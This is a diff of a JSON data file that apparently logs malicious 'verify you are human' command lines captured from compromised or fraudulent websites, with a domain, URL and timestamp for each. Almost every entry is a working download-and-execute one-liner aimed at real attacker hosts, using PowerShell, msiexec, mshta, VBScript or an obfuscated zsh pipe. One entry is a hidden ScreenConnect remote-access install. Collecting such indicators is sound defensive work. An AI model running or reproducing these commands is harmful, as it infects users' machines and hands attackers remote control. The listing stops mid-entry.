@@ -1,5 +1,719 @@
 [
   {
+    "domain": "socheaphost.com",
+    "url": "https://socheaphost.com/SSA_GOV/",
+    "timestamp": "2026-02-25T20:01:35.039Z",
+    "commandline": "powershell -Command \"Start-Process msiexec.exe -Verb RunAs -ArgumentList '/i https://raw.githubusercontent.com/a52231421/oneday/main/ScreenConnect.ClientSetup.msi /qn /norestart ARPSYSTEMCOMPONENT=1 /log %TEMP%\\install.log' -Wait; Start-Sleep 5; 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | % { Get-ItemProperty $_ -EA SilentlyContinue | ? { $_.DisplayName -like \"*ScreenConnect Client*\" } | % { Remove-ItemProperty -Path $_.PSPath -Name DisplayName -EA SilentlyContinue; Set-ItemProperty -Path $_.PSPath -Name SystemComponent -Type DWord -Value 1 } }\" # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3045''"
+  },
+  {
+    "domain": "www.gieable.shop",
+    "url": "https://www.gieable.shop/",
+    "timestamp": "2026-02-25T01:08:29.777Z",
+    "commandline": "powershell -c iex(irm 158.94.209.33 -UseBasicParsing)"
+  },
+  {
+    "domain": "dblanka.com",
+    "url": "https://dblanka.com/",
+    "timestamp": "2026-02-24T07:05:57.506Z",
+    "commandline": "powershell -wi mi -EP Bypass -c \"$a='gatepass';$b='-corp.com/';$c='toljhnxgvhcsfduwzf';iex ((New-Object Net.WebClient).DownloadString(('http://'+$a+$b+$c)))\""
+  },
+  {
+    "domain": "www.namsioc.shop",
+    "url": "https://www.namsioc.shop/",
+    "timestamp": "2026-02-24T01:03:34.180Z",
+    "commandline": "powershell -c iex(irm 158.94.209.33 -UseBasicParsing)"
+  },
+  {
+    "domain": "digiskillzz.com",
+    "url": "https://digiskillzz.com/best-youtube-seo-tools-2026/",
+    "timestamp": "2026-02-23T18:02:24.327Z",
+    "commandline": "powershell -wi mi -EP Bypass -c \"$a='gatepass';$b='-corp.com/';$c='toljhnxgvhcsfduwzf';iex ((New-Object Net.WebClient).DownloadString(('http://'+$a+$b+$c)))\""
+  },
+  {
+    "domain": "159.69.10.36",
+    "url": "https://159.69.10.36/",
+    "timestamp": "2026-02-23T13:05:05.572Z",
+    "commandline": "cmd.exe /c powershell -w h -ep Bypass -nop -c \"$d='p.ps1';$y=$env:USERPROFILE+'\\\\Downloads\\\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;\""
+  },
+  {
+    "domain": "gatepass-corp.com",
+    "url": "https://gatepass-corp.com/lhmgazksaccvarxoyo",
+    "timestamp": "2026-02-23T11:02:36.143Z",
+    "commandline": "powershell -wi mi -EP Bypass -c \"$a='gatepass';$b='-corp.com/';$c='toljhnxgvhcsfduwzf';iex ((New-Object Net.WebClient).DownloadString(('http://'+$a+$b+$c)))\""
+  },
+  {
+    "domain": "brickmechanics.com",
+    "url": "https://brickmechanics.com/",
+    "timestamp": "2026-02-22T21:31:53.760Z",
+    "commandline": "powershell -wi mi -EP B -c iex(irm 82.25.63.150/Q.GRE)"
+  },
+  {
+    "domain": "12aedehyj4dg79vd6w00fck854y3vun4cqgj.t3.storage.dev",
+    "url": "https://12aedehyj4dg79vd6w00fck854y3vun4cqgj.t3.storage.dev/Verify-to-Continue-ID-ktpos-260216.html",
+    "timestamp": "2026-02-22T17:01:34.805Z",
+    "commandline": "powershell -wi mi -EP B -c iex(irm 193.169.194.5/uu.txt)"
+  },
+  {
+    "domain": "aiselfie.cam",
+    "url": "https://aiselfie.cam/",
+    "timestamp": "2026-02-22T01:02:50.962Z",
+    "commandline": "wscript //B \\\\159.65.201.180@80\\request\\verify\\captcha.vbs # echo Cloudflare Browser Captcha Verification Request 425"
+  },
+  {
+    "domain": "mac-os-helper.com",
+    "url": "https://mac-os-helper.com/",
+    "timestamp": "2026-02-21T15:01:41.694Z",
+    "commandline": "echo '593356796243417461325a7a553077676148523063484d364c79397659335276634739344c6d4e766253396a64584a734c7a517a4e6a526d4e6a45354f4749304d7a51304e5467345a4456685a5459354d54426d59574a6c4d474978596a5669596d4a684e7a4d3159544e6b5a4459345a6d49345a4751334d7a6b335a4459774e6d566a4f474638656e4e6f' | xxd -r -p | base64 -D | zsh"
+  },
+  {
+    "domain": "45.8.93.27",
+    "url": "https://45.8.93.27/",
+    "timestamp": "2026-02-21T09:10:05.206Z",
+    "commandline": "powershell -wi mi -EP B -c iex(irm kernsjewe.com/download/os.txt)"
+  },
+  {
+    "domain": "goarnsds.shop",
+    "url": "https://goarnsds.shop/",
+    "timestamp": "2026-02-20T23:01:51.808Z",
+    "commandline": "powershell -c iex(irm 158.94.209.33 -UseBasicParsing)"
+  },
+  {
+    "domain": "89.58.25.125",
+    "url": "https://89.58.25.125/",
+    "timestamp": "2026-02-19T21:01:15.257Z",
+    "commandline": "msiexec /i https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
+  },
+  {
+    "domain": "www.gorscts.shop",
+    "url": "https://www.gorscts.shop/",
+    "timestamp": "2026-02-18T17:04:03.426Z",
+    "commandline": "powershell -c iex(irm 45.61.148.118 -UseBasicParsing)"
+  },
+  {
+    "domain": "binadata.com",
+    "url": "https://binadata.com/",
+    "timestamp": "2026-02-18T10:31:08.688Z",
+    "commandline": "mshta http://185.147.125.174:8000/1234.html #                                                        '' I'm human ID7189283746684738''"
+  },
+  {
+    "domain": "greecpt.shop",
+    "url": "https://greecpt.shop/",
+    "timestamp": "2026-02-17T17:02:11.630Z",
+    "commandline": "powershell -c iex(irm 158.94.209.33 -UseBasicParsing)"
+  },
+  {
+    "domain": "bnr.international",
+    "url": "https://bnr.international/?id=9228023&__cf_chl_rt_tk=0WTT341v83OfTlu9_sVt0mpCGs8eiXGuXRj0LgIbMkt4-1759406441-1.0.1.1-cKgxnjeNC3bilN23wwtGd4ZTe00EYBZDCXqqw55zKFcc",
+    "timestamp": "2026-02-17T11:07:23.835Z",
+    "commandline": "powershell  \"iwr 'https://raw.githubusercontent.com/hello32423423/test.ps1/refs/heads/main/test.ps1' | iex\""
+  },
+  {
+    "domain": "193.222.99.212",
+    "url": "https://193.222.99.212/",
+    "timestamp": "2026-02-17T01:12:55.149Z",
+    "commandline": "powershell -w mi -ep Bypass -nop -c \"$d='p.ps1';$y=Join-Path ([Environment]::GetFolderPath('MyPictures')) \"$d\";Start-Sleep 15;irm 'nobovcs.com' -OutFile $y;& $y;Remove-Item $y -Force;\""
+  },
+  {
+    "domain": "captioz.shop",
+    "url": "https://captioz.shop/",
+    "timestamp": "2026-02-12T01:06:04.191Z",
+    "commandline": "powershell -c iex(irm 158.94.209.33 -UseBasicParsing)"
+  },
+  {
+    "domain": "psicogenealogia.com.br",
+    "url": "https://psicogenealogia.com.br/",
+    "timestamp": "2026-02-11T15:04:44.304Z",
+    "commandline": "cmd.exe /c powershell -w h -ep Bypass -nop -c \"$d='p.ps1';$y=$env:USERPROFILE+'\\\\Downloads\\\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;\""
+  },
+  {
+    "domain": "6yjgi2ue4qhb1zn1i65zpwdyii7k50vr0mprzvaz.t3.storage.dev",
+    "url": "https://6yjgi2ue4qhb1zn1i65zpwdyii7k50vr0mprzvaz.t3.storage.dev/Verify-to-Continue-ID-vdpo-26020910.html",
+    "timestamp": "2026-02-10T13:01:27.928Z",
+    "commandline": "powershell -wi mi -EP B -c iex(irm 78.40.209.86:5506/qq.txt)                                                                      "
+  },
+  {
+    "domain": "namzcp.org",
+    "url": "https://namzcp.org/",
+    "timestamp": "2026-02-08T21:01:44.681Z",
+    "commandline": "powershell -c iex(irm 158.94.209.33 -UseBasicParsing)"
+  },
+  {
+    "domain": "bds3.umemarketingagency.com",
+    "url": "https://bds3.umemarketingagency.com/",
+    "timestamp": "2026-02-06T09:01:21.821Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://198.13.158.127:5506/ny.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%\\ny.vbs\" && \"%temp%\\ny.vbs\""
+  },
+  {
+    "domain": "117a78bb33.nxcli.net",
+    "url": "https://117a78bb33.nxcli.net/",
+    "timestamp": "2026-02-06T07:33:22.350Z",
+    "commandline": "msiexec /i https://pizzabyte.com.au/smartdetection/deviceverification/CF/path/captcha"
+  },
+  {
+    "domain": "acc.mecha-service.nl",
+    "url": "https://acc.mecha-service.nl/",
+    "timestamp": "2026-02-06T07:32:34.678Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "admin.jnishop.com",
+    "url": "https://admin.jnishop.com/",
+    "timestamp": "2026-02-06T07:31:46.434Z",
+    "commandline": "msiexec /i https://pizzabyte.com.au/smartdetection/deviceverification/CF/path/captcha"
+  },
+  {
+    "domain": "accsories.xin",
+    "url": "https://accsories.xin/",
+    "timestamp": "2026-02-06T07:30:59.101Z",
+    "commandline": "cmd.exe /c powershell -w h -ep Bypass -nop -c \"$d='p.ps1';$y=$env:USERPROFILE+'\\\\Downloads\\\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;\""
+  },
+  {
+    "domain": "autoconfig.oikiastays.perspectiveunity.com",
+    "url": "https://autoconfig.oikiastays.perspectiveunity.com/",
+    "timestamp": "2026-02-06T07:30:10.194Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "aeromodelosconcepcion.com",
+    "url": "https://aeromodelosconcepcion.com/",
+    "timestamp": "2026-02-06T07:29:21.726Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify"
+  },
+  {
+    "domain": "berna-und-max.lenz-berauscht.de",
+    "url": "https://berna-und-max.lenz-berauscht.de/",
+    "timestamp": "2026-02-06T07:28:33.021Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://78.40.209.164:5506/wk.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%wk.vbs\" && \"%temp%wk.vbs\""
+  },
+  {
+    "domain": "admin.ilygold.com",
+    "url": "https://admin.ilygold.com/",
+    "timestamp": "2026-02-06T07:27:44.725Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "bravepolice.com",
+    "url": "https://bravepolice.com/",
+    "timestamp": "2026-02-06T07:26:30.552Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "asgwellness.korrakang.com",
+    "url": "https://asgwellness.korrakang.com/",
+    "timestamp": "2026-02-06T07:25:42.828Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "bh3.umemarketingagency.com",
+    "url": "https://bh3.umemarketingagency.com/",
+    "timestamp": "2026-02-06T07:24:51.846Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://198.13.158.127:5506/ny.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%\\ny.vbs\" && \"%temp%\\ny.vbs\""
+  },
+  {
+    "domain": "cupom.prgss.dev",
+    "url": "https://cupom.prgss.dev/",
+    "timestamp": "2026-02-06T07:23:54.521Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "www.canacopachuca.com",
+    "url": "https://www.canacopachuca.com/",
+    "timestamp": "2026-02-06T07:23:05.827Z",
+    "commandline": "cmd /c \"curl -s http://178.17.59.40:5506/qk.vbs -o %temp%\\qk.vbs >nul && wscript.exe //B //E:VBScript %temp%\\qk.vbs\""
+  },
+  {
+    "domain": "demo14.netbazaarbd.com",
+    "url": "https://demo14.netbazaarbd.com/",
+    "timestamp": "2026-02-06T07:22:18.015Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "ddledu.dev.sugaweb.com",
+    "url": "https://ddledu.dev.sugaweb.com/",
+    "timestamp": "2026-02-06T07:21:29.525Z",
+    "commandline": "msiexec /i https://mhw.codes/check"
+  },
+  {
+    "domain": "bxsandbox2.pragma.by",
+    "url": "https://bxsandbox2.pragma.by/",
+    "timestamp": "2026-02-06T07:20:40.206Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://78.40.209.164:5506/wk.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%wk.vbs\" && \"%temp%wk.vbs\""
+  },
+  {
+    "domain": "dev.ghcoop.vn",
+    "url": "https://dev.ghcoop.vn/",
+    "timestamp": "2026-02-06T07:19:51.412Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "celik.bewapps.com",
+    "url": "https://celik.bewapps.com/",
+    "timestamp": "2026-02-06T07:19:02.657Z",
+    "commandline": "msiexec /i https://mhw.codes/check"
+  },
+  {
+    "domain": "dev.18m.sn",
+    "url": "https://dev.18m.sn/",
+    "timestamp": "2026-02-06T07:18:12.804Z",
+    "commandline": "cmd.exe /c powershell -w h -ep Bypass -nop -c \"$d='p.ps1';$y=$env:USERPROFILE+'\\\\Downloads\\\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;\""
+  },
+  {
+    "domain": "destinationecuador.com.tropiceco.com",
+    "url": "https://destinationecuador.com.tropiceco.com/",
+    "timestamp": "2026-02-06T07:17:00.887Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "epigrams.co.uk",
+    "url": "https://epigrams.co.uk/",
+    "timestamp": "2026-02-06T07:15:42.431Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "fiscaldynamicswest.com",
+    "url": "https://fiscaldynamicswest.com/",
+    "timestamp": "2026-02-06T07:14:54.785Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "goldnews24h.com.yemint.com",
+    "url": "https://goldnews24h.com.yemint.com/",
+    "timestamp": "2026-02-06T07:14:04.276Z",
+    "commandline": "msiexec /i https://mhw.codes/check"
+  },
+  {
+    "domain": "gamboozarecover.crearhosting.com",
+    "url": "https://gamboozarecover.crearhosting.com/",
+    "timestamp": "2026-02-06T07:13:13.241Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "funpasta.webdevlink.com",
+    "url": "https://funpasta.webdevlink.com/",
+    "timestamp": "2026-02-06T07:12:03.134Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "gereja.neoxdev.com",
+    "url": "https://gereja.neoxdev.com/",
+    "timestamp": "2026-02-06T07:11:15.488Z",
+    "commandline": "cmd /c \"curl -s http://178.17.59.40:5506/qk.vbs -o %temp%\\qk.vbs >nul && wscript.exe //B //E:VBScript %temp%\\qk.vbs\""
+  },
+  {
+    "domain": "herbertbrewerbooks.com.laneacquisition.com",
+    "url": "https://herbertbrewerbooks.com.laneacquisition.com/",
+    "timestamp": "2026-02-06T07:10:27.155Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify"
+  },
+  {
+    "domain": "heritagecraftshub.com",
+    "url": "https://heritagecraftshub.com/",
+    "timestamp": "2026-02-06T07:09:39.225Z",
+    "commandline": "cmd.exe /c powershell -w h -ep Bypass -nop -c \"$h='b.ps1';$n=$env:USERPROFILE+'\\\\Downloads\\\\'+$h;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://penguinpublishers.org/files/audio/', $n);& $n;Remove-Item $n -Force;\""
+  },
+  {
+    "domain": "iglesia.efata.org",
+    "url": "https://iglesia.efata.org/",
+    "timestamp": "2026-02-06T07:08:51.793Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "hablaportafolio.com",
+    "url": "https://hablaportafolio.com/",
+    "timestamp": "2026-02-06T07:08:04.286Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://78.40.209.164:5506/wk.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%wk.vbs\" && \"%temp%wk.vbs\""
+  },
+  {
+    "domain": "lns.owl.temporary.site",
+    "url": "https://lns.owl.temporary.site/",
+    "timestamp": "2026-02-06T07:07:14.061Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://198.13.158.127:5506/ny.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%\\ny.vbs\" && \"%temp%\\ny.vbs\""
+  },
+  {
+    "domain": "kft.kusherp.com",
+    "url": "https://kft.kusherp.com/",
+    "timestamp": "2026-02-06T07:06:25.363Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "konferenceappka.bartvisions.cz",
+    "url": "https://konferenceappka.bartvisions.cz/",
+    "timestamp": "2026-02-06T07:05:36.169Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://198.13.158.127:5506/ny.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%\\ny.vbs\" && \"%temp%\\ny.vbs\""
+  },
+  {
+    "domain": "mail.casadostoldoslimeira.com.br",
+    "url": "https://mail.casadostoldoslimeira.com.br/",
+    "timestamp": "2026-02-06T07:04:47.774Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "mail.binbinartgallery.com",
+    "url": "https://mail.binbinartgallery.com/",
+    "timestamp": "2026-02-06T07:04:00.151Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://78.40.209.164:5506/wk.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%wk.vbs\" && \"%temp%wk.vbs\""
+  },
+  {
+    "domain": "mail.evascientific.com",
+    "url": "https://mail.evascientific.com/",
+    "timestamp": "2026-02-06T07:03:09.337Z",
+    "commandline": "cmd.exe /c powershell -w h -ep Bypass -nop -c \"$d='p.ps1';$y=$env:USERPROFILE+'\\\\Downloads\\\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;\""
+  },
+  {
+    "domain": "mail.createubebeni.com",
+    "url": "https://mail.createubebeni.com/",
+    "timestamp": "2026-02-06T07:02:21.142Z",
+    "commandline": "cmd /c \"curl -s http://178.17.59.40:5506/qk.vbs -o %temp%\\qk.vbs >nul && wscript.exe //B //E:VBScript %temp%\\qk.vbs\""
+  },
+  {
+    "domain": "jcptacticalllc.com",
+    "url": "https://jcptacticalllc.com/",
+    "timestamp": "2026-02-06T07:01:33.717Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "support.asseryassin.com",
+    "url": "https://support.asseryassin.com/",
+    "timestamp": "2026-02-04T19:01:19.299Z",
+    "commandline": "powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'https://ledger.ftp4cbc.com/ledger-setup/View.ClientSetup.exe' -OutFile \\\"$env:TEMP\\\\setup.exe\\\"; Start-Process \\\"$env:TEMP\\\\setup.exe\\\"\""
+  },
+  {
+    "domain": "captoolsz.com",
+    "url": "https://captoolsz.com/",
+    "timestamp": "2026-02-04T17:01:30.513Z",
+    "commandline": "powershell -c iex(irm 158.94.209.33 -UseBasicParsing)"
+  },
+  {
+    "domain": "www.support.asseryassin.com",
+    "url": "https://www.support.asseryassin.com/",
+    "timestamp": "2026-02-03T13:01:50.002Z",
+    "commandline": "powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'https://ledger.ftp4cbc.com/ledger-setup/View.ClientSetup.exe' -OutFile \\\"$env:TEMP\\\\setup.exe\\\"; Start-Process \\\"$env:TEMP\\\\setup.exe\\\"\""
+  },
+  {
+    "domain": "kolscan.fi",
+    "url": "https://kolscan.fi/",
+    "timestamp": "2026-02-02T23:32:56.147Z",
+    "commandline": "mshta http://cloudflaɾe.com"
+  },
+  {
+    "domain": "one-safe.io",
+    "url": "https://one-safe.io/",
+    "timestamp": "2026-02-02T23:03:55.341Z",
+    "commandline": "mshta http://cloudflaɾe.com"
+  },
+  {
+    "domain": "cz-douyin.com",
+    "url": "https://cz-douyin.com/",
+    "timestamp": "2026-02-02T23:02:59.050Z",
+    "commandline": "mshta http://dexscɾeeneɾ.com"
+  },
+  {
+    "domain": "www.rigogabriele.it",
+    "url": "https://www.rigogabriele.it/",
+    "timestamp": "2026-02-02T20:35:47.369Z",
+    "commandline": "powershell -wi mi -EP B -c iex(irm 23.94.252.134/b.GRE)"
+  },
+  {
+    "domain": "capztoolz.com",
+    "url": "https://capztoolz.com/",
+    "timestamp": "2026-02-02T09:05:04.432Z",
+    "commandline": "powershell -c iex(irm 158.94.209.33 -UseBasicParsing)"
+  },
+  {
+    "domain": "willlog7.com",
+    "url": "https://willlog7.com/",
+    "timestamp": "2026-02-02T09:03:19.060Z",
+    "commandline": "cmd /c \"curl -s http://178.17.59.195:5506/ll.vbs -o %temp%\\ll.vbs >nul && wscript.exe //B //E:VBScript %temp%\\ll.vbs\""
+  },
+  {
+    "domain": "smtp.bldg-restoration.com",
+    "url": "https://smtp.bldg-restoration.com/",
+    "timestamp": "2026-02-02T09:02:02.807Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://198.13.158.127:5506/ny.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%\\ny.vbs\" && \"%temp%\\ny.vbs\""
+  },
+  {
+    "domain": "mail.peablueinteriors.co.uk",
+    "url": "https://mail.peablueinteriors.co.uk/",
+    "timestamp": "2026-02-02T08:32:07.537Z",
+    "commandline": "cmd.exe /c powershell -w h -ep Bypass -nop -c \"$d='p.ps1';$y=$env:USERPROFILE+'\\\\Downloads\\\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;\""
+  },
+  {
+    "domain": "mail.kvmjcleaning.ca",
+    "url": "https://mail.kvmjcleaning.ca/",
+    "timestamp": "2026-02-02T08:31:19.346Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://78.40.209.164:5506/wk.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%wk.vbs\" && \"%temp%wk.vbs\""
+  },
+  {
+    "domain": "wehouse.au",
+    "url": "https://wehouse.au/",
+    "timestamp": "2026-02-02T07:33:49.368Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "wowlabzstaging.com",
+    "url": "https://wowlabzstaging.com/",
+    "timestamp": "2026-02-02T07:32:59.944Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://198.13.158.127:5506/ny.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%\\ny.vbs\" && \"%temp%\\ny.vbs\""
+  },
+  {
+    "domain": "webiz-magazine.com",
+    "url": "https://webiz-magazine.com/",
+    "timestamp": "2026-02-02T07:32:11.728Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "vsure.trumpcode.com",
+    "url": "https://vsure.trumpcode.com/",
+    "timestamp": "2026-02-02T07:31:21.733Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://198.13.158.127:5506/ny.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%\\ny.vbs\" && \"%temp%\\ny.vbs\""
+  },
+  {
+    "domain": "thietbilanh.cokhiviendong.com",
+    "url": "https://thietbilanh.cokhiviendong.com/",
+    "timestamp": "2026-02-02T07:30:06.534Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://95.164.53.115:5506/do.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%do.tmp\" && wscript //E:VBScript \"%temp%do.tmp\""
+  },
+  {
+    "domain": "webdisk.karamelsitges.com",
+    "url": "https://webdisk.karamelsitges.com/",
+    "timestamp": "2026-02-02T07:29:10.213Z",
+    "commandline": "powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt';\"$om=$kh+$b+$c;$i='{0}{1}{2}' -f 'Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\""
+  },
+  {
+    "domain": "tenabl.io",
+    "url": "https://tenabl.io/",
+    "timestamp": "2026-02-02T07:28:22.674Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "visa.ourdubaitravel.com",
+    "url": "https://visa.ourdubaitravel.com/",
+    "timestamp": "2026-02-02T07:27:34.682Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "tileroofinglasvegas.com",
+    "url": "https://tileroofinglasvegas.com/",
+    "timestamp": "2026-02-02T07:26:46.330Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "theoldschool.sc",
+    "url": "https://theoldschool.sc/",
+    "timestamp": "2026-02-02T07:25:58.431Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "thetavernonfourth-com.bubars.com",
+    "url": "https://thetavernonfourth-com.bubars.com/",
+    "timestamp": "2026-02-02T07:25:10.460Z",
+    "commandline": "msiexec /i https://i-like-ele-phants-verification.live/iamchallenge/verification/UserID7383526"
+  },
+  {
+    "domain": "soko-jikara.jp",
+    "url": "https://soko-jikara.jp/",
+    "timestamp": "2026-02-02T07:24:22.245Z",
+    "commandline": "cmd.exe /c powershell -w h -ep Bypass -nop -c \"$h='b.ps1';$n=$env:USERPROFILE+'\\\\Downloads\\\\'+$h;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://penguinpublishers.org/files/audio/', $n);& $n;Remove-Item $n -Force;\""
+  },
+  {
+    "domain": "tamara.scrappinmonkeys.com",
+    "url": "https://tamara.scrappinmonkeys.com/",
+    "timestamp": "2026-02-02T07:23:32.628Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "techtotalix.com.topmostfreight.com",
+    "url": "https://techtotalix.com.topmostfreight.com/",
+    "timestamp": "2026-02-02T07:22:43.235Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://78.40.209.164:5506/wk.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%wk.vbs\" && \"%temp%wk.vbs\""
+  },
+  {
+    "domain": "sultanshopee.ninetysix.in",
+    "url": "https://sultanshopee.ninetysix.in/",
+    "timestamp": "2026-02-02T07:21:52.505Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://78.40.209.164:5506/wk.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%wk.vbs\" && \"%temp%wk.vbs\""
+  },
+  {
+    "domain": "smartpromotions.seanborgmans.com",
+    "url": "https://smartpromotions.seanborgmans.com/",
+    "timestamp": "2026-02-02T07:21:05.054Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "sales.activemedicaresolutions.com",
+    "url": "https://sales.activemedicaresolutions.com/",
+    "timestamp": "2026-02-02T07:20:15.806Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "pgadmin.ddsis.com.mx",
+    "url": "https://pgadmin.ddsis.com.mx/",
+    "timestamp": "2026-02-02T07:19:24.904Z",
